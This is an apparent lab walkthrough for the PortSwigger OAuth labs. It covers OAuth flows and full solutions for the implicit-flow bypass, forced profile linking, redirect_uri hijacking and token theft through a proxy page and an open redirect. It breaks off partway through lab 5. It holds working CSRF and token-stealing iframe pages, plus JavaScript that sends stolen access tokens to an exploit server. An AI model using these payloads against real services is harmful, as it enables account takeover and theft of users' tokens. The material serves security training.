# OAuth Authentication - Complete PortSwigger Labs Guide

## Table of Contents
1. [Overview](#overview)
2. [OAuth 2.0 Fundamentals](#oauth-20-fundamentals)
3. [Lab Solutions](#lab-solutions)
   - [Lab 1: Authentication Bypass via OAuth Implicit Flow](#lab-1-authentication-bypass-via-oauth-implicit-flow)
   - [Lab 2: Forced OAuth Profile Linking](#lab-2-forced-oauth-profile-linking)
   - [Lab 3: OAuth Account Hijacking via redirect_uri](#lab-3-oauth-account-hijacking-via-redirect_uri)
   - [Lab 4: Stealing OAuth Access Tokens via a Proxy Page](#lab-4-stealing-oauth-access-tokens-via-a-proxy-page)
   - [Lab 5: Stealing OAuth Access Tokens via an Open Redirect](#lab-5-stealing-oauth-access-tokens-via-an-open-redirect)
   - [Lab 6: SSRF via OpenID Dynamic Client Registration](#lab-6-ssrf-via-openid-dynamic-client-registration)
4. [Common OAuth Vulnerabilities](#common-oauth-vulnerabilities)
5. [Attack Techniques Summary](#attack-techniques-summary)
6. [Burp Suite Workflows](#burp-suite-workflows)
7. [Real-World Exploitation](#real-world-exploitation)

---

## Overview

OAuth 2.0 is an authorization framework that enables third-party applications to obtain limited access to user accounts without exposing credentials. While OAuth provides strong security when properly implemented, misconfigurations and implementation flaws create critical vulnerabilities.

### PortSwigger OAuth Labs Summary

| Lab # | Name | Difficulty | Vulnerability Type | Time |
|-------|------|------------|-------------------|------|
| 1 | Authentication bypass via OAuth implicit flow | Apprentice | Improper validation | 5 min |
| 2 | Forced OAuth profile linking | Apprentice | Missing CSRF protection | 10 min |
| 3 | OAuth account hijacking via redirect_uri | Apprentice | redirect_uri validation bypass | 5 min |
| 4 | Stealing OAuth access tokens via proxy page | Practitioner | Directory traversal + postMessage | 15 min |
| 5 | Stealing OAuth access tokens via open redirect | Practitioner | Directory traversal + open redirect | 15 min |
| 6 | SSRF via OpenID dynamic client registration | Practitioner | SSRF via logo_uri | 10 min |

---

## OAuth 2.0 Fundamentals

### OAuth 2.0 Flow Types

**1. Authorization Code Flow** (Most Secure)
```
User → Client → Authorization Server (user approves)
Authorization Server → Client (authorization code)
Client → Authorization Server (code + client_secret)
Authorization Server → Client (access token)
```

**2. Implicit Flow** (Deprecated - Security Issues)
```
User → Client → Authorization Server (user approves)
Authorization Server → Client (access token in URL fragment)
```

**3. Client Credentials Flow** (Machine-to-Machine)
```
Client → Authorization Server (client_id + client_secret)
Authorization Server → Client (access token)
```

**4. Resource Owner Password Credentials** (Avoid)
```
User → Client (username + password)
Client → Authorization Server (credentials)
Authorization Server → Client (access token)
```

### Key OAuth Components

- **Resource Owner**: The user who owns the data
- **Client Application**: Third-party app requesting access
- **Authorization Server**: Issues tokens after authentication
- **Resource Server**: API hosting protected resources
- **Access Token**: Credential for accessing resources
- **Authorization Code**: Short-lived code exchanged for token
- **Redirect URI**: Where authorization server sends responses
- **State Parameter**: CSRF protection token
- **Scope**: Permissions requested by client

### OpenID Connect (OIDC)

Extension of OAuth 2.0 for authentication:
- Adds identity layer on top of OAuth 2.0
- Issues ID tokens (JWT) containing user information
- Includes `/userinfo` endpoint for profile data
- Uses `/.well-known/openid-configuration` for discovery

---

## Lab Solutions

### Lab 1: Authentication Bypass via OAuth Implicit Flow

**Lab Details**
- **Difficulty**: Apprentice
- **Objective**: Access Carlos's account (carlos@carlos-montoya.net)
- **Vulnerability**: Client application fails to validate OAuth response parameters server-side

#### Vulnerability Description

The application uses the OAuth implicit flow and trusts user-supplied data in the OAuth response without server-side verification. The authentication endpoint accepts any email address in the POST request body, regardless of the associated access token.

#### Step-by-Step Solution

**Step 1: Complete Normal OAuth Flow**

1. Click "My account" on the blog website
2. Log in using credentials: `wiener:peter`
3. Observe the OAuth flow in Burp Proxy

**Step 2: Analyze HTTP Traffic**

In Burp Suite Proxy > HTTP history:

**Authorization Request:**
```http
GET /auth?client_id=YOUR-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback&response_type=token&nonce=123456789&scope=openid%20profile%20email HTTP/1.1
Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
```

**OAuth Server Redirect:**
```http
HTTP/1.1 302 Found
Location: https://YOUR-LAB-ID.web-security-academy.net/oauth-callback#access_token=TOKEN&expires_in=3600&token_type=Bearer&scope=openid%20profile%20email
```

**Critical Vulnerability - Authentication Request:**
```http
POST /authenticate HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/json

{
    "email": "wiener@hotdog.com",
    "username": "wiener",
    "token": "YOUR_ACCESS_TOKEN"
}
```

**Step 3: Exploit the Vulnerability**

1. Send the `POST /authenticate` request to Burp Repeater
2. Modify the `email` parameter to victim's email:

```http
POST /authenticate HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/json

{
    "email": "carlos@carlos-montoya.net",
    "username": "wiener",
    "token": "YOUR_ACCESS_TOKEN"
}
```

3. Send the request
4. Right-click → "Request in browser" → "In original session"
5. Copy URL and paste in browser
6. You are now authenticated as Carlos

#### HTTP Request/Response Details

**Exploitation Request:**
```http
POST /authenticate HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/json
Content-Length: 103

{"email":"carlos@carlos-montoya.net","username":"wiener","token":"Vja8zYfDkvP0QXCJJzl9uFLZT4zI3DkC"}
```

**Successful Response:**
```http
HTTP/1.1 302 Found
Location: /my-account
Set-Cookie: session=NEW_SESSION_COOKIE
```

#### Burp Suite Techniques

1. **Proxy Interception**: Capture OAuth flow
2. **HTTP History**: Identify authentication endpoint
3. **Repeater**: Modify and test authentication requests
4. **Request in Browser**: Convert modified requests to browser URLs

#### Common Mistakes

- ❌ Modifying the access token instead of email
- ❌ Forgetting to use "Request in browser" feature
- ❌ Not using JSON Content-Type header
- ❌ Modifying authorization request instead of authentication request

#### Troubleshooting

- Ensure Burp is actively proxying traffic
- Verify you're modifying the POST to `/authenticate` (not OAuth server)
- Keep the original access token from your session
- Check that email format is valid

#### Real-World Impact

This vulnerability allows complete account takeover without knowledge of victim credentials. Similar issues have affected:
- Social login integrations on e-commerce platforms
- Mobile app OAuth implementations
- SaaS applications with third-party authentication

---

### Lab 2: Forced OAuth Profile Linking

**Lab Details**
- **Difficulty**: Apprentice
- **Objective**: Use CSRF attack to link your social profile to admin account, then delete user "carlos"
- **Vulnerability**: Missing `state` parameter in OAuth flow enables CSRF attacks

#### Vulnerability Description

The OAuth profile linking mechanism lacks CSRF protection. The authorization request omits the `state` parameter, allowing attackers to trick authenticated users into linking the attacker's OAuth profile to their account. When the attacker subsequently logs in via OAuth, they gain access to the victim's account.

#### Step-by-Step Solution

**Step 1-2: Reconnaissance**

1. Log in with credentials: `wiener:peter`
2. Navigate to "My account"
3. Click "Attach a social profile"

**Step 3-4: Complete OAuth Linking**

1. Authenticate with social credentials: `peter.wiener:hotdog`
2. Observe successful OAuth linking
3. Log out and verify OAuth login works

**Step 5-6: Identify CSRF Vulnerability**

In Burp Proxy history, find the authorization request:

```http
GET /auth?client_id=YOUR-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-linking&response_type=code&scope=openid%20profile%20email HTTP/1.1
Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
```

**Critical Observation**: No `state` parameter present!

The OAuth callback request:
```http
GET /oauth-linking?code=AUTHORIZATION_CODE HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=VICTIM_SESSION
```

**Step 7-9: Capture Fresh Authorization Code**

1. Turn ON Burp Proxy interception
2. Click "Attach a social profile" again
3. Intercept the `GET /oauth-linking?code=...` request
4. **Copy the complete URL with code parameter**
5. **Drop the request** (preserves code validity)
6. Turn OFF interception
7. Log out

**Example Intercepted Request:**
```http
GET /oauth-linking?code=L1fUDj2w8Wv6T_kQRiPsJXCHcw9Nz2xp HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=your-session-cookie
```

**Step 10-11: Create CSRF Exploit**

Store this HTML on the exploit server:

```html
<html>
<head>
    <title>Special Offer</title>
</head>
<body>
<h1>Loading your special offer...</h1>
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/oauth-linking?code=L1fUDj2w8Wv6T_kQRiPsJXCHcw9Nz2xp"></iframe>
</body>
</html>
```

**Attack Flow:**
1. Admin visits exploit page (has active session)
2. Iframe loads `/oauth-linking?code=STOLEN_CODE`
3. Application links attacker's OAuth profile to admin's account
4. Attacker logs in via OAuth → gains admin access

**Step 12: Execute Attack**

1. Store exploit on exploit server
2. Click "Deliver exploit to victim"
3. Wait for admin to visit
4. Return to blog homepage
5. Click "My account"
6. Select OAuth login (social media)
7. You're now logged in as administrator
8. Access admin panel
9. Delete user "carlos"
10. Lab solved! ✅

#### HTTP Request/Response Flow

**1. Normal Authorization:**
```http
GET /auth?client_id=xyz&redirect_uri=https://lab.net/oauth-linking&response_type=code&scope=openid%20profile%20email HTTP/1.1
Host: oauth-server.net

HTTP/1.1 302 Found
Location: https://lab.net/oauth-linking?code=AUTH_CODE
```

**2. Exploit Delivery:**
```http
GET /exploit HTTP/1.1
Host: exploit-server.net

HTTP/1.1 200 OK
Content-Type: text/html

<iframe src="https://lab.net/oauth-linking?code=STOLEN_CODE"></iframe>
```

**3. CSRF Attack (Admin's Browser):**
```http
GET /oauth-linking?code=STOLEN_CODE HTTP/1.1
Host: lab.net
Cookie: session=ADMIN_SESSION_COOKIE

HTTP/1.1 302 Found
Location: /my-account
```

**4. Attacker OAuth Login:**
```http
GET /oauth-callback?code=NEW_CODE HTTP/1.1
Host: lab.net

HTTP/1.1 302 Found
Set-Cookie: session=ADMIN_SESSION_TOKEN
Location: /my-account
```

#### Burp Suite Techniques

1. **Proxy Interception**: Capture and drop OAuth linking requests
2. **HTTP History**: Analyze OAuth flow for missing CSRF tokens
3. **Exploit Server**: Host malicious iframe payload
4. **Request Dropping**: Preserve authorization code validity

#### Common Mistakes

- ❌ Not dropping the intercepted request (code becomes invalid)
- ❌ Using an expired authorization code
- ❌ Forgetting to log out before delivering exploit
- ❌ Hidden iframe preventing proper code exchange

#### Troubleshooting

- Authorization codes are **single-use** - drop intercepted request
- Codes expire in 60-300 seconds - work quickly
- Admin must have active session when visiting exploit
- Test exploit on yourself first before delivering
- Ensure iframe `src` URL is complete with code parameter

#### Real-World Impact

**CVE Examples:**
- Gitpod CSWSH vulnerability (2023)
- Multiple OAuth providers with missing state validation
- SaaS platforms with social login features

**Consequences:**
- Complete account takeover
- Unauthorized access to admin accounts
- Data breaches via profile linking attacks
- Identity confusion and privilege escalation

---

### Lab 3: OAuth Account Hijacking via redirect_uri

**Lab Details**
- **Difficulty**: Apprentice
- **Objective**: Steal admin's authorization code and hijack their account to delete user "carlos"
- **Vulnerability**: OAuth provider fails to validate `redirect_uri` parameter, allowing arbitrary external domains

#### Vulnerability Description

The OAuth service doesn't properly validate the `redirect_uri` parameter, accepting arbitrary domains including attacker-controlled servers. By sending a malicious OAuth authorization link to an authenticated victim, attackers can intercept authorization codes and use them to hijack accounts.

#### Step-by-Step Solution

**Step 1: Reconnaissance**

1. Log in via OAuth to observe normal flow
2. In Burp Proxy history, locate authorization request:

```http
GET /auth?client_id=YOUR-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email HTTP/1.1
Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
```

**Step 2-3: Test redirect_uri Validation**

1. Send authorization request to Burp Repeater
2. Modify `redirect_uri` to your exploit server:

```http
GET /auth?client_id=YOUR-CLIENT-ID&redirect_uri=https://exploit-YOUR-EXPLOIT-SERVER.exploit-server.net&response_type=code&scope=openid%20profile%20email HTTP/1.1
Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
```

3. Send request and observe response:

```http
HTTP/1.1 302 Found
Location: https://exploit-YOUR-EXPLOIT-SERVER.exploit-server.net?code=AUTHORIZATION_CODE_HERE
```

✅ **Vulnerability Confirmed**: OAuth server redirects to arbitrary domain!

**Step 4: Proof of Concept**

1. Visit the modified authorization URL in browser
2. Complete OAuth flow
3. Check exploit server access log:

```
10.0.0.1 "GET /?code=PoC_AUTHORIZATION_CODE HTTP/1.1" 200
```

**Step 5-6: Create Exploit Iframe**

Build an iframe that automatically triggers OAuth with malicious redirect:

```html
<html>
<head>
    <title>Win a Free Prize!</title>
</head>
<body>
<h1>Loading your prize...</h1>
<iframe src="https://oauth-YOUR-OAUTH-SERVER.oauth-server.net/auth?client_id=YOUR-CLIENT-ID&redirect_uri=https://exploit-YOUR-EXPLOIT-SERVER.exploit-server.net&response_type=code&scope=openid%20profile%20email" style="width:0;height:0;border:0;"></iframe>
</body>
</html>
```

**How It Works:**
1. Victim visits exploit page
2. Hidden iframe triggers OAuth authorization
3. If victim has active OAuth session, auto-approval occurs
4. Authorization code redirects to attacker's server
5. Attacker captures code from access logs

**Step 7: Deliver Exploit**

1. Store exploit on exploit server
2. Click "Deliver exploit to victim"
3. Admin (with active OAuth session) automatically completes flow

**Step 8: Extract and Use Authorization Code**

1. Check exploit server access log
2. Find admin's authorization code:

```
10.0.3.125 "GET /?code=ADMIN_AUTHORIZATION_CODE HTTP/1.1" 404
```

3. Manually construct callback URL with stolen code:

```
https://YOUR-LAB-ID.web-security-academy.net/oauth-callback?code=ADMIN_AUTHORIZATION_CODE
```

4. Navigate to this URL in your browser
5. Application exchanges code for admin's access token
6. You're now logged in as administrator
7. Access admin panel
8. Delete user "carlos"
9. Lab solved! ✅

#### HTTP Request/Response Flow

**Attack Sequence:**

**1. Victim Loads Exploit (Iframe):**
```http
GET /exploit HTTP/1.1
Host: exploit-server.net

HTTP/1.1 200 OK
Content-Type: text/html

<iframe src="https://oauth-server.net/auth?...&redirect_uri=https://exploit-server.net..."></iframe>
```

**2. OAuth Server Redirects (Victim Has Active Session):**
```http
GET /auth?client_id=xyz&redirect_uri=https://exploit-server.net&response_type=code&scope=openid%20profile%20email HTTP/1.1
Host: oauth-server.net
Cookie: oauth-session=VICTIM_SESSION

HTTP/1.1 302 Found
Location: https://exploit-server.net?code=VICTIM_AUTHORIZATION_CODE
```

**3. Attacker Checks Access Log:**
```
[Victim-IP] "GET /?code=Ab3xR9pL2mK8Tn5Q HTTP/1.1" 404
```

**4. Attacker Uses Stolen Code:**
```http
GET /oauth-callback?code=Ab3xR9pL2mK8Tn5Q HTTP/1.1
Host: lab.web-security-academy.net
Cookie: session=ATTACKER_SESSION

HTTP/1.1 302 Found
Set-Cookie: session=ADMIN_SESSION_TOKEN
Location: /my-account
```

#### Burp Suite Techniques

1. **Proxy**: Capture OAuth authorization requests
2. **Repeater**: Test redirect_uri validation bypass
3. **Exploit Server**: Host malicious iframe and collect leaked codes
4. **Access Logs**: Monitor for victim authorization codes
5. **Request Modification**: Manually construct callback URLs

#### Common Mistakes

- ❌ Using expired authorization code (60-300 second lifetime)
- ❌ Not waiting for victim's OAuth session to be active
- ❌ Incorrect redirect_uri format in exploit
- ❌ Forgetting to URL-encode redirect_uri parameter
- ❌ Using GET request instead of navigating to callback URL

#### Troubleshooting

**Authorization Code Expired:**
- Codes typically expire in 60-300 seconds
- Deliver exploit again to get fresh code
- Work quickly after seeing code in logs

**No Code in Access Logs:**
- Victim must have active OAuth session
- Ensure iframe src URL is complete and correct
- Check that OAuth server accepts your redirect_uri

**Code Doesn't Work:**
- Authorization codes are single-use only
- Don't test code before using for final attack
- Ensure you're using code with your own session cookie

#### Real-World Impact

**Affected Platforms:**
- Social media OAuth implementations
- Enterprise SSO providers
- Mobile app deep link handlers
- Third-party authentication services

**Consequences:**
- Complete account takeover
- Access to sensitive user data
- Privilege escalation to admin accounts
- Mass exploitation via phishing campaigns

**Similar Vulnerabilities:**
- Weak redirect_uri validation (prefix matching)
- Open redirect chains to bypass validation
- Subdomain takeover for whitelisted domains

---

### Lab 4: Stealing OAuth Access Tokens via a Proxy Page

**Lab Details**
- **Difficulty**: Practitioner
- **Objective**: Steal admin's OAuth access token and use it to obtain their API key
- **Vulnerability**: Directory traversal in redirect_uri + insecure postMessage() implementation

#### Vulnerability Description

This lab chains three vulnerabilities:

1. **Directory Traversal in redirect_uri**: OAuth service fails to prevent path traversal sequences (`../`) allowing redirection to unintended application pages
2. **Insecure postMessage()**: Comment form uses `postMessage()` to send `window.location.href` to parent window with wildcard origin (`*`)
3. **Token Leakage**: Access tokens in URL fragments are leaked through the messaging vulnerability

#### Step-by-Step Solution

**Step 1: Reconnaissance**

1. Log in via OAuth and complete normal flow
2. Analyze authorization request in Burp:

```http
GET /auth?client_id=YOUR-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback&response_type=token&nonce=123456789&scope=openid%20profile%20email HTTP/1.1
Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
```

**Step 2: Discover /me Endpoint**

Test OAuth token with API endpoint:

```http
GET /me HTTP/1.1
Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
Authorization: Bearer YOUR_ACCESS_TOKEN

HTTP/1.1 200 OK
Content-Type: application/json

{
    "sub": "wiener",
    "name": "Peter Wiener",
    "email": "wiener@hotdog.com",
    "apikey": "your-api-key-here"
}
```

**Step 3: Test Directory Traversal**

In Burp Repeater, modify redirect_uri with path traversal:

```http
GET /auth?client_id=YOUR-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=123456789&scope=openid%20profile%20email HTTP/1.1
Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
```

✅ **Vulnerability Confirmed**: OAuth server accepts traversal and redirects to comment form!

**Step 4: Identify postMessage Vulnerability**

Browse to blog post and view comment form source:

```javascript
// Comment form JavaScript (vulnerable code)
parent.postMessage({
    type: 'onload',
    data: window.location.href
}, '*')
```

**Critical Flaw**: Wildcard origin (`*`) allows any site to receive messages!

**Step 5: Chain Vulnerabilities**

When OAuth redirects to comment form with token in URL fragment:
```
/post/comment/comment-form#access_token=TOKEN&expires_in=3600&token_type=Bearer
```

The comment form's JavaScript sends full URL (with fragment) via postMessage to parent window.

**Step 6: Create Exploit**

Build exploit that captures leaked token:

```html
<html>
<body>
<h1>Loading...</h1>

<!-- Iframe triggers OAuth with directory traversal -->
<iframe src="https://oauth-YOUR-OAUTH-SERVER.oauth-server.net/auth?client_id=YOUR-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=RANDOM-NONCE&scope=openid%20profile%20email"></iframe>

<!-- JavaScript captures postMessage with token -->
<script>
window.addEventListener('message', function(e) {
    // Comment form sends window.location.href which includes token fragment
    // Exfiltrate to our access logs
    fetch("/?stolen=" + encodeURIComponent(e.data.data))
}, false)
</script>
</body>
</html>
```

**Attack Flow:**
1. Victim loads exploit page
2. Iframe triggers OAuth authorization
3. OAuth redirects to: `/oauth-callback/../post/comment/comment-form#access_token=TOKEN`
4. Path resolves to: `/post/comment/comment-form#access_token=TOKEN`
5. Comment form sends token via postMessage
6. Exploit captures message and exfiltrates to access logs

**Step 7: Deploy and Extract Token**

1. Store exploit on exploit server
2. Click "Deliver exploit to victim"
3. Check exploit server access log:

```
10.0.3.125 "GET /?stolen=%2Foauth-callback%2F..%2Fpost%2Fcomment%2Fcomment-form%23access_token%3DAdminTokenHere%26expires_in%3D3600%26token_type%3DBearer%26scope%3Dopenid%2520profile%2520email HTTP/1.1" 200
```

4. URL decode to extract clean token:
```
/oauth-callback/../post/comment/comment-form#access_token=AdminTokenHere&expires_in=3600&token_type=Bearer&scope=openid%20profile%20email
```

5. Token value: `AdminTokenHere`

**Step 8: Use Stolen Token**

Query `/me` endpoint with admin's token:

```http
GET /me HTTP/1.1
Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
Authorization: Bearer AdminTokenHere

HTTP/1.1 200 OK
Content-Type: application/json

{
    "sub": "administrator",
    "name": "Administrator",
    "email": "administrator@example.com",
    "apikey": "ADMIN_API_KEY_HERE"
}
```

**Step 9: Submit Solution**

1. Copy the `apikey` value from response
2. Submit API key via lab interface
3. Lab solved! ✅

#### HTTP Request/Response Flow

**Complete Attack Chain:**

**Request 1: Victim Loads Exploit**
```http
GET /exploit HTTP/1.1
Host: exploit-server.net

HTTP/1.1 200 OK
Content-Type: text/html

<iframe src="...oauth...redirect_uri=.../oauth-callback/../post/comment/comment-form..."></iframe>
<script>window.addEventListener('message', ...)</script>
```

**Request 2: Iframe Triggers OAuth (Victim Has Session)**
```http
GET /auth?client_id=xyz&redirect_uri=https://lab.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=123&scope=openid%20profile%20email HTTP/1.1
Host: oauth-server.net
Cookie: oauth-session=VICTIM_SESSION
```

**Response 2: OAuth Server Redirects with Token**
```http
HTTP/1.1 302 Found
Location: https://lab.net/oauth-callback/../post/comment/comment-form#access_token=VICTIM_TOKEN&expires_in=3600&token_type=Bearer&scope=openid%20profile%20email
```

**Request 3: Browser Follows Redirect (Path Traversal Resolves)**
```http
GET /post/comment/comment-form HTTP/1.1
Host: lab.net
# Note: Fragment (#access_token=...) preserved in browser but not sent to server
```

**JavaScript Execution in Comment Form:**
```javascript
// Comment form sends message
parent.postMessage({
    type: 'onload',
    data: 'https://lab.net/post/comment/comment-form#access_token=VICTIM_TOKEN&expires_in=3600...'
}, '*')
```

**Request 4: Exploit JavaScript Exfiltrates Token**
```http
GET /?stolen=...comment-form%23access_token%3DVICTIM_TOKEN... HTTP/1.1
Host: exploit-server.net
```

**Request 5: Attacker Uses Stolen Token**
```http
GET /me HTTP/1.1
Host: oauth-server.net
Authorization: Bearer VICTIM_TOKEN

HTTP/1.1 200 OK
{"sub":"administrator","apikey":"ADMIN_KEY"}
```

#### Burp Suite Techniques

1. **Proxy History**: Identify postMessage vulnerabilities in JavaScript
2. **Repeater**: Test directory traversal in redirect_uri
3. **Exploit Server**: Host malicious iframe and JavaScript
4. **Access Logs**: Extract leaked tokens from server logs
5. **Request Modification**: Add Authorization headers with stolen tokens
6. **Decoder**: URL decode access log entries

#### Common Mistakes

- ❌ Not using unique nonce for each OAuth request
- ❌ Forgetting URL fragment is never sent in HTTP requests
- ❌ Missing encodeURIComponent() in fetch exfiltration
- ❌ Testing exploit without checking browser console for errors
- ❌ Not URL decoding access log entries to extract token

#### Troubleshooting

**No postMessage Received:**
- Check browser console for JavaScript errors
- Ensure iframe loads successfully
- Verify comment form exists at expected path
- Test postMessage listener with console.log()

**Token Not in Access Logs:**
- Verify fetch() executes (check Network tab)
- Ensure wildcard origin (*) allows cross-origin messages
- Check that iframe and parent can communicate
- Victim must complete OAuth flow (have active session)

**Access Token Invalid:**
- Tokens typically expire in 3600 seconds (1 hour)
- Ensure you're extracting complete token value
- Remove URL encoding artifacts
- Verify Authorization header format: `Bearer TOKEN`

#### Real-World Impact

**Similar Vulnerabilities:**
- Facebook OAuth directory traversal (various bug bounty reports)
- Google OAuth postMessage leaks
- Enterprise SSO implementations with messaging vulnerabilities

**Consequences:**
- Account takeover via stolen access tokens
- API access with victim's permissions
- Data exfiltration from OAuth-protected resources
- Privilege escalation in multi-tenant applications

**Defense Requirements:**
1. Strict redirect_uri validation (no directory traversal)
2. Specify explicit origins in postMessage()
3. Validate message origins in listeners
4. Use authorization code flow instead of implicit
5. Implement PKCE for additional security

---

### Lab 5: Stealing OAuth Access Tokens via an Open Redirect

**Lab Details**
- **Difficulty**: Practitioner
- **Objective**: Steal admin's OAuth access token and use it to obtain their API key
- **Vulnerability**: Weak redirect_uri validation + application open redirect

#### Vulnerability Description

This lab chains two vulnerabilities to steal OAuth access tokens:

1. **Path Traversal in redirect_uri**: OAuth service validates redirect_uri with whitelist but fails to prevent directory traversal (`/../`)
2. **Open Redirect**: Blog application's "Next post" feature (`/post/next?path=`) redirects to arbitrary URLs without validation
3. **Token Leakage Chain**: Combining these vulnerabilities allows redirecting OAuth callbacks (with tokens in URL fragments) to attacker-controlled domains

#### Step-by-Step Solution

**Step 1: Reconnaissance**

1. Log in via OAuth and analyze flow
2. Identify authorization endpoint in Burp:

```http
GET /auth?client_id=YOUR-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback&response_type=token&nonce=123456789&scope=openid%20profile%20email HTTP/1.1
Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
```

**Step 2: Test /me Endpoint**

Verify API access with your token:

```http
GET /me HTTP/1.1
Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
Authorization: Bearer YOUR_ACCESS_TOKEN

HTTP/1.1 200 OK
{
    "sub": "wiener",
    "name": "Peter Wiener",
    "email": "wiener@hotdog.com",
    "apikey": "your-api-key"
}
```

**Step 3: Test redirect_uri Validation**

In Burp Repeater, test if path traversal is allowed:

```http
GET /auth?client_id=YOUR-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../&response_type=token&nonce=123456789&scope=openid%20profile%20email HTTP/1.1
Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
```

✅ **Vulnerability Confirmed**: OAuth server accepts directory traversal!

**Step 4: Identify Open Redirect**

Browse blog posts and click "Next post" link:

```http
GET /post/next?path=/post/2 HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net

HTTP/1.1 302 Found
Location: /post/2
```

Test with external URL:

```http
GET /post/next?path=https://exploit-server.net HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net

HTTP/1.1 302 Found
Location: https://exploit-server.net
```

✅ **Open Redirect Confirmed**: Application redirects to arbitrary URLs!

**Step 5: Chain Vulnerabilities**

Combine directory traversal + open redirect:

```
redirect_uri = https://lab.net/oauth-callback/../post/next?path=https://exploit-server.net/exploit
```

**Attack Flow:**
1. OAuth server redirects to: `/oauth-callback/../post/next?path=https://exploit-server.net/exploit#access_token=TOKEN`
2. Path resolves to: `/post/next?path=https://exploit-server.net/exploit#access_token=TOKEN`
3. Open redirect forwards to: `https://exploit-server.net/exploit#access_token=TOKEN`
4. Token is now on attacker's domain with fragment preserved!

**Complete malicious authorization URL:**
```http
GET /auth?client_id=YOUR-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-YOUR-EXPLOIT-SERVER.exploit-server.net/exploit&response_type=token&nonce=RANDOM-NONCE&scope=openid%20profile%20email HTTP/1.1
Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
```

**Step 6: Create Token Extraction Exploit**

The exploit page needs JavaScript to read and exfiltrate the token from URL fragment:

```html
<html>
<head>
    <title>Loading...</title>
</head>
<body>
<h1>Please wait...</h1>

<script>
// Check if we have a token in the URL fragment
if (window.location.hash) {
    // Extract the entire fragment (everything after #)
    var token = window.location.hash.substring(1);

    // Exfiltrate to exploit server where we can read from access logs
    window.location = '/?stolen=' + token;
}
</script>
</body>
</html>
```

**Why JavaScript is Necessary:**
- URL fragments (after `#`) are never sent in HTTP requests
- Only JavaScript can access `window.location.hash`
- Must redirect to new URL to get fragment data in server logs

**Step 7: Deploy Complete Exploit**

Create iframe that triggers entire chain:

```html
<html>
<body>
<h1>Loading your content...</h1>

<iframe src="https://oauth-YOUR-OAUTH-SERVER.oauth-server.net/auth?client_id=YOUR-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-YOUR-EXPLOIT-SERVER.exploit-server.net/exploit&response_type=token&nonce=RANDOM-NONCE&scope=openid%20profile%20email"></iframe>
</body>
</html>
```

**Important**: Store the JavaScript exploit at `/exploit` path on exploit server FIRST, then create the iframe exploit as main page.

**Step 8: Execute Attack**

1. Store JavaScript token extractor at exploit server `/exploit` path
2. Store iframe exploit as main exploit page
3. Click "Deliver exploit to victim"
4. Admin's browser executes the attack chain

**Step 9: Extract Token from Logs**

Check exploit server access logs:

```
10.0.3.125 "GET /?stolen=access_token%3DADMIN_TOKEN_HERE%26expires_in%3D3600%26token_type%3DBearer%26scope%3Dopenid%2520profile%2520email HTTP/1.1" 200
```

URL decode the stolen parameter:
```
access_token=ADMIN_TOKEN_HERE&expires_in=3600&token_type=Bearer&scope=openid%20profile%20email
```

Extract token value: `ADMIN_TOKEN_HERE`

**Step 10: Use Stolen Token**

Query `/me` endpoint with admin's token:

```http
GET /me HTTP/1.1
Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
Authorization: Bearer ADMIN_TOKEN_HERE

HTTP/1.1 200 OK
{
    "sub": "administrator",
    "name": "Administrator",
    "email": "administrator@example.com",
    "apikey": "ADMIN_API_KEY_VALUE"
}
```

**Step 11: Submit Solution**

1. Copy `apikey` value from response
2. Submit via lab interface
3. Lab solved! ✅

#### HTTP Request/Response Flow

**Complete Attack Chain:**

**Request 1: Victim Loads Iframe**
```http
GET /exploit HTTP/1.1
Host: exploit-server.net

HTTP/1.1 200 OK
<iframe src="https://oauth-server.net/auth?...redirect_uri=.../oauth-callback/../post/next?path=https://exploit-server.net/exploit..."></iframe>
```

**Request 2: Iframe Triggers OAuth (Victim Has Session)**
```http
GET /auth?client_id=xyz&redirect_uri=https://lab.net/oauth-callback/../post/next?path=https://exploit-server.net/exploit&response_type=token&nonce=123&scope=openid%20profile%20email HTTP/1.1
Host: oauth-server.net
Cookie: oauth-session=VICTIM_SESSION
```

**Response 2: OAuth Server Redirects with Token**
```http
HTTP/1.1 302 Found
Location: https://lab.net/oauth-callback/../post/next?path=https://exploit-server.net/exploit#access_token=VICTIM_TOKEN&expires_in=3600&token_type=Bearer&scope=openid%20profile%20email
```

**Request 3: Browser Follows Redirect (Path Traversal Resolves)**
```http
GET /post/next?path=https://exploit-server.net/exploit HTTP/1.1
Host: lab.net
